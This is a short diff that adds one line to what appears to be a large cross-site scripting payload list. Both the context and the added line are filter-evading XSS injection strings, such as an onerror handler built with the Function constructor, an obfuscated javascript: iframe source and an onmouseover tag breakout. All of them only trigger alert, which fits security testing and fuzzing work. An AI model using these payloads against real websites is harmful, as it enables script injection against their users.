@@ -1713,3 +1713,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
 <img/src=q onerror='new Function`al\ert\`1\``'>
 <script>location.href;'javascript:alert%281%29'</script>
+'"</Script><Html Onmouseover=(alert)(1) //
